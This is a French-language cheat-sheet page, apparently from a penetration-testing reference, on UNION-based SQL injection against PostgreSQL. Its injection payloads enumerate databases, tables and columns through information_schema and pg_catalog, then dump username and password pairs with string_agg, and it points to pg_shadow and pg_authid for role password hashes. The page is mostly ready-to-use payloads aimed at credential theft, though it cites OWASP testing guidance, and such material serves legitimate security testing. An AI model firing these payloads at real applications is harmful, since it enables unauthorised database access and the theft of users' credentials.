---
title: "Extraire le schéma et les données PostgreSQL avec UNION"
description: "Énumérer les bases, tables et colonnes dans PostgreSQL via information_schema et pg_catalog, puis dumper les lignes avec string_agg."
keywords:
  - information_schema
  - pg_catalog
  - string_agg
  - pg_tables
  - énumération de colonnes
---

# Extraire le schéma et les données

Une fois une colonne de texte reflétée trouvée, les catalogues de PostgreSQL cartographient le serveur et `string_agg()` regroupe de nombreuses lignes dans la cellule unique. Les exemples supposent une requête à trois colonnes avec la deuxième colonne reflétée.

Listez les bases de données depuis le catalogue natif :

```sql
' UNION SELECT NULL,string_agg(datname,','),NULL FROM pg_database-- 
```

Listez les tables de la base de données courante. Le filtre `table_schema='public'` restreint les résultats au schéma propre à l'application plutôt qu'aux tables système :

```sql
' UNION SELECT NULL,string_agg(table_name,','),NULL FROM information_schema.tables WHERE table_schema='public'-- 
```

Listez les colonnes d'une table cible, contraintes au schéma pour que des tables de même nom dans d'autres schémas ne fusionnent pas :

```sql
' UNION SELECT NULL,string_agg(column_name,','),NULL FROM information_schema.columns WHERE table_name='users' AND table_schema='public'-- 
```

Dumpez les lignes, en castant en `text` et en joignant les champs avec un délimiteur :

```sql
' UNION SELECT NULL,string_agg(username||':'||password,E'\n'),NULL FROM users-- 
```

Quand `information_schema` est filtré, `pg_catalog` donne les mêmes données sous d'autres noms : `pg_tables` liste les tables, `pg_namespace` liste les schémas, et `pg_attribute` joint à `pg_class` liste les colonnes. Le magasin d'identifiants lui-même est `pg_shadow` (ou `pg_authid`), lisible uniquement par un superutilisateur, qui contient les empreintes des mots de passe des rôles.

## Outils

- **sqlmap** : extraction union automatisée parcourant information_schema et pg_catalog.
- **psql** : client officiel pour confirmer directement les requêtes de catalogue.

## Références

- PostgreSQL Documentation: `information_schema`, system catalogs, `string_agg`
- OWASP Testing Guide: Testing for SQL Injection
